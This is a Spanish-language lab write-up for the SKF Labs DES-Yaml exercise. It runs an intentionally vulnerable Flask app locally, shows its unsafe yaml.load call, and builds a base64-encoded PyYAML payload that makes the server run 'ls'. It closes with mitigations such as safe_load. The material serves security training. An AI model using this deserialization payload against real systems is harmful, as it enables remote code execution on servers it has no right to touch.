
# 💥 Ataques de Deserialización

> Parte de [[OWASP]]  
> La teoria viene de [[Ataques de Deserialización]]
> Glosario relacionado: [[Serializacion y Deserializacion]]

---

## 🧪 Práctica en SKF Labs

Ruta: `skf-labs/python/DES-Yaml`  
Este laboratorio simula una aplicación vulnerable a ataques de deserialización con **YAML** en **Python 2**.

> 🐍 Requiere Python 2 → se recomienda usar Docker (incluye Dockerfile)

---

## 🐳 Docker: correr el laboratorio

### 1. Construir la imagen

```bash
docker build -t des .
```

📌 `-t des`: etiqueta la imagen con el nombre `des`.

---

### 2. Correr el contenedor

```bash
docker run -dit -p 127.0.0.1:5000:5000 des
```

📌 Redirecciona el puerto `5000` de tu host al `5000` del contenedor (donde corre Flask).

---

## 🌐 Comportamiento de la app

Al ingresar a `http://localhost:5000/`, redirige automáticamente a una URL con datos en **Base64**:

```
http://localhost:5000/information/eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==
```

Decodificando:

```bash
echo -n "eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==" | base64 -d
```

🔎 Resultado:

```
yaml: The information page is still under construction, updates coming soon!
```

---

## 🧬 Análisis del código fuente (Flask)

```python
@app.route("/information/<input>", methods=['GET'])
def deserialization(input):
    try:
        yaml_file = base64.b64decode(input)       # 🔓 ← decodifica
        content = yaml.load(yaml_file)            # 🔥 ← deserializa sin validar
    except:
        content = "The application was unable to deserialize the object!"
    return render_template("index.html", content = content['yaml'])
```

⚠️ **Problema clave**:

- `yaml.load(...)` deserializa datos arbitrarios sin validación.
    
- Si se inyecta un objeto malicioso, se puede ejecutar **código en el servidor**.
    

---

## 🧪 Payload de explotación

Para YAML, se puede inyectar ejecución de comandos (si no hay sanitización).

Ejemplo tomado de [pkmurphy.com.au/isityaml](https://www.pkmurphy.com.au/isityaml/):

```yaml
"contents_of_cwd": !!python/object/apply:subprocess.check_output ['ls']
```

Usamos esta estructura en la app vulnerable:

```yaml
yaml: !!python/object/apply:subprocess.check_output ['ls']
```

---

## 🔐 Generar payload y codificar en base64

1. Guardás el payload en un archivo (por ejemplo: `data`):
    

```
yaml: !!python/object/apply:subprocess.check_output ['ls']
```

2. Codificás con:
    

```bash
cat data | base64 -w 0; echo
```

Salida:

```
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFsnbHMnXQo=
```

---

## 🚀 Exploit final

Visitás en el navegador:

```
http://localhost:5000/information/eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFsnbHMnXQo=
```

🖥️ Resultado en la página:

```
b'DES.py\nDockerfile\nevil_server.py\nfile.yml\nhacker_input.txt\nrequirements.txt\nstatic\ntemplates\n'
```

✅ ¡Se ejecutó el comando `ls` en el servidor!

---

## 🔒 Lecciones aprendidas

- **Nunca uses `yaml.load()` con datos externos.**
    
- Usá `yaml.safe_load()` para evitar ejecución de objetos.
    
- Validá siempre la entrada del usuario.
    
- Serialización insegura = ejecución remota de código (RCE).
    
